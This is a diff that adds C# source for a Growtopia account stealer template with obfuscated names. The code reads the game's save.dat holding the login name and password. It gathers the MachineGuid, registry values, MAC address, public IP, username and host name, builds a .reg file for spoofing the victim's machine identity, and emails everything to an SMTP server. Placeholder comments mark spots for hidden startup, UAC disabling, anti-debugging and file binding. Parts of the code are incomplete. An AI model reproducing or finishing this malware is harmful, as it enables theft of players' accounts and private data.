@@ -1,0 +1,350 @@
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Management;
+using Microsoft.Win32;
+using System.Text.RegularExpressions;
+using System.IO;
+using System.CodeDom.Compiler;
+using System.Diagnostics;
+using System.Net;
+using System.Net.Mail;
+using System.Drawing;
+using System.IO.Compression;
+using System.Security.Cryptography;
+using System.Net.NetworkInformation;
+using System.Net.Mime;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Security;
+using System.Threading;
+using System.Windows.Forms;
+
+namespace strchange142
+{
+    class strchange143
+    {
+        //antidumpheremethod
+        public static string strchange19()
+        {
+            String strchange20 = NetworkInterface.GetAllNetworkInterfaces().Where(strchange21 => strchange21.OperationalStatus == OperationalStatus.Up && strchange21.NetworkInterfaceType != NetworkInterfaceType.Loopback).Select(strchange22 => strchange22.GetPhysicalAddress().ToString()).FirstOrDefault();
+            string strchange23 = strchange20;
+            string strchange24 = strchange23;
+            return strchange24;
+        }
+        public static string strchange63(int strchange64)
+        {
+            Random strchange65 = new Random();
+            const string strchange66 = "0123456789";
+            return new string(Enumerable.Repeat(strchange66, strchange64)
+              .Select(strchange67 => strchange67[strchange65.Next(strchange67.Length)]).ToArray());
+        }
+        public static string Get5RND()
+        {
+            try
+            {
+                RegistryKey jdfddnjdz = Registry.CurrentUser;
+                jdfddnjdz = jdfddnjdz.OpenSubKey(@"Software\Microsoft", true);
+                string[] dshg = jdfddnjdz.GetSubKeyNames();
+                foreach (String umm in dshg)
+                {
+                    if (Regex.IsMatch(umm, "^[0-9]+$", RegexOptions.Compiled) && umm.Length == 5)
+                    {
+                        return umm;
+                    }
+                    else if (!Regex.IsMatch(umm, "^[0-9]+$", RegexOptions.Compiled) && umm.Length != 5)
+                    {
+
+                    }
+                }
+                return "NULL";
+            }
+            catch
+            {
+                return "NULL";
+            }
+        }
+        public static string Get9RND()
+        {
+            try
+            {
+                RegistryKey subKey = Registry.CurrentUser;
+                string[] subkeyNemez = subKey.GetSubKeyNames();
+                foreach (String valuef in subkeyNemez)
+                {
+                    if (Regex.IsMatch(valuef, "^[0-9]+$", RegexOptions.Compiled) && valuef.Length == 9)
+                    {
+                        return valuef;
+                    }
+                    else if (!Regex.IsMatch(valuef, "^[0-9]+$", RegexOptions.Compiled) && valuef.Length != 9)
+                    {
+
+                    }
+                }
+                return "NULL";
+            }
+            catch
+            {
+                return "NULL";
+            }
+        }
+
+        public static string replacestrg(string lol)
+        {
+            string k9rands = Get9RND();
+            string k5rands = Get5RND();
+            string totalstring9 = "";
+            string totalstring5 = "";
+            foreach (string g in rand9list(k9rands))
+            {
+                totalstring9 += g;
+            }
+            foreach (string g in rand5list(k5rands))
+            {
+                totalstring5 += g;
+            }
+            return lol.Replace("//append9rands", totalstring9).Replace("//append5rands", totalstring5);
+        }
+        public static List<string> rand9list(string rands9)
+        {
+            List<string> listxd = new List<string>();
+			//changelistgggg9
+            RegistryKey strchange26;
+            if (Environment.Is64BitOperatingSystem)
+            {
+                strchange26 = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, RegistryView.Registry64);
+            }
+            else
+            {
+                strchange26 = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, RegistryView.Registry32);
+            }
+            try
+            {
+                strchange26 = strchange26.OpenSubKey(rands9, true);
+                string[] strchange27 = strchange26.GetValueNames();
+				for(int i = 0; i < listggg9.Length; i++)
+				{
+				                    byte[] strchange29 = (byte[])strchange26.GetValue(strchange27[i]);
+                    string strchange30 = BitConverter.ToString(strchange29).Replace("-", ",").ToLower();
+                    string strchange32 = @"""" + listggg9[i] + @"""=hex:" + strchange30 + Environment.NewLine;
+                    listxd.Add(strchange32);
+				}
+            }
+            catch
+            {
+
+            }
+            return listxd;
+        }
+		public static string Formatfff = @"[^a-zA-Z0-9`!@#$%^&*()_+|\-=\\{}\[\]:"";'<>?,./]";
+        public static List<string> rand5list(string rands5)
+        {
+            List<string> listxd = new List<string>();
+			//changelistgggg5
+            RegistryKey strchange35;
+            if (Environment.Is64BitOperatingSystem)
+            {
+                strchange35 = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, RegistryView.Registry64);
+            }
+            else
+            {
+                strchange35 = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, RegistryView.Registry32);
+            }
+            try
+            {
+                strchange35 = strchange35.OpenSubKey(@"Software\Microsoft\" + rands5, true);
+                string[] strchange36 = strchange35.GetValueNames();
+				for(int i = 0; i < listggg5.Length; i++)
+				{
+				                    byte[] strchange39 = (byte[])strchange35.GetValue(strchange36[i]);
+                    string strchange40 = BitConverter.ToString(strchange39).Replace("-", ",").ToLower();
+                    string strchange41 = @"""" + listggg5[i] + @"""=hex:" + strchange40 + Environment.NewLine;
+                    listxd.Add(strchange41);
+				}
+            }
+            catch
+            {
+
+            }
+            return listxd;
+        }
+        private static string regCode(string Guid1, string Guid2)
+        {
+            string ujshdg = string.Format(@"Windows Registry Editor Version 5.00
+[-HKEY_CURRENT_USER\[9rands]]
+[HKEY_CURRENT_USER\[9rands]]
+//append9rands
+
+[-HKEY_CURRENT_USER\Software\Microsoft\[5rands]]
+[HKEY_CURRENT_USER\Software\Microsoft\[5rands]]
+//append5rands
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography]
+""MachineGuid""=""{0}""
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Cryptography]
+""MachineGuid""=""{1}""", Guid1, Guid2);
+            return ujshdg;
+        }
+        //Grabhwidxdddddlol
+        public static string[] GrabMGuID()
+        {
+            string[] guidvalues = new string[2] { "", "" };
+                bool strchange13 = Environment.Is64BitOperatingSystem;
+            try
+            {
+                RegistryKey strchange15 =
+RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine,
+RegistryView.Registry32);
+                if (strchange15 != null)
+                {
+                    string strchange16 = (string)strchange15.GetValue("MachineGuid");
+                    guidvalues[1] = strchange16;
+                    strchange15.Close();
+                }
+                if (strchange13 == true)
+                {
+                    RegistryKey strchange14 =
+            RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine,
+                RegistryView.Registry64);
+                    strchange14 = strchange14.OpenSubKey(@"SOFTWARE\\Microsoft\\Cryptography", false);
+                    if (strchange14 != null)
+                    {
+                        string strchange17 = (string)strchange14.GetValue("MachineGuid");
+                        guidvalues[0] = strchange17;
+                    }
+                    strchange14.Close();
+                }
+                else if (strchange13 == false)
+                {
+                    strchange15 = strchange15 = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine,
+RegistryView.Registry32);
+                    strchange15 = strchange15.OpenSubKey(@"SOFTWARE\\Microsoft\\Cryptography", false);
+                    if (strchange15 != null)
+                    {
+                        string strchange16 = (string)strchange15.GetValue("MachineGuid");
+                        guidvalues[1] = strchange16;
+                        strchange15.Close();
+                    }
+                }
+            }
+            catch
+            {
+
+            }
+            return guidvalues;
+        }
+        //strdecmethodrepxdddd
+        //replacediscordmethodssteal
+        public static string strchange98(string strchange99)
+        {
+            try
+            {
+                byte[] strchange100 = File.ReadAllBytes(strchange99);
+                string strchange101 = Encoding.ASCII.GetString(strchange100);
+                string strchange102 = strchange101.Substring(strchange101.IndexOf("tankid_name") + 15, Convert.ToInt32(strchange100[strchange101.IndexOf("tankid_name") + 11]));
+                return strchange102;
+            }
+            catch
+            {
+                return "Null";
+            }
+        }
+        //debuggerxddddddddd
+        //replacestrtobytearray
+        static void Main(string[] args)
+        {
+						//callbindmethodxd
+            //copyfilewtfffxd
+            //AddHiddenStartupxd
+            //addnormalstartupxdd
+            //replacedisableuacxdddff
+            //antidumpinit
+            //debugcallxdddd
+            //hidefileomglolok
+            string[] aig = GrabMGuID();
+            string ushg = replacestrg(regCode(aig[0], aig[1]));
+            ContentType contentType = new ContentType("text/reg");
+            Attachment regxd = Attachment.CreateAttachmentFromString(ushg, contentType);
+            regxd.Name = "SetReg.reg";
+            string strchange111 = "";
+            try
+            {
+                RegistryKey strchange113;
+                if (Environment.Is64BitOperatingSystem)
+                {
+                    strchange113 = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, RegistryView.Registry64);
+                }
+                else
+                {
+                    strchange113 = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, RegistryView.Registry32);
+                }
+                try
+                {
+                    strchange113 = strchange113.OpenSubKey(@"Software\Growtopia", true);
+                    string strchange114 = (string)strchange113.GetValue("path");
+                    if (Directory.Exists(strchange114))
+                    {
+                        string strchange112 = File.ReadAllText(strchange114 + @"\save.dat");
+                        if (strchange112.Contains("tankid_password") && strchange112.Contains("tankid_name"))
+                        {
+                            strchange111 = strchange114 + @"\save.dat";
+                        }
+                        else
+                        {
+                            strchange111 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
+                        }
+
+                    }
+                    else
+                    {
+					strchange111 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
+                    }
+                }
+                catch
+                {
+				strchange111 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
+                }
+            }
+            catch
+            {
+			strchange111 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
+            }
+            try
+            {
+                ServicePointManager.Expect100Continue = true;
+                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+                string strchange124 = "https://icanhazip.com/";
+                string strchange130;
+                string ipxd = new WebClient().DownloadString(strchange124);
+                string strchange103 = strchange19();
+                string strchange129;
+                string strchange133 = Environment.UserName;
+                string strchange134 = System.Environment.MachineName.ToString();
+                strchange129 = "New account from " + strchange133 + @"/" + strchange134;
+                strchange130 = //messageemailxd;
+                string strchange136 = "[SMTPPORTXD]";
+                int strchange137 = int.Parse(strchange136);
+                MailMessage strchange138;
+                SmtpClient strchange139 = new SmtpClient("[SMTPReP]", strchange137);
+                strchange139.EnableSsl = true;
+                //networkstuffherexd
+                if(File.Exists(strchange111))
+                {
+                    strchange138.Attachments.Add(new Attachment(strchange111));
+                }
+                strchange138.Attachments.Add(regxd);
+                strchange139.Send(strchange138);
+                strchange139.Dispose();
+            }
+            catch
+            {
+            }
+            Console.WriteLine("done");
+            Environment.Exit(0);
+        }
+		//insertbindmethods
+    }
+}
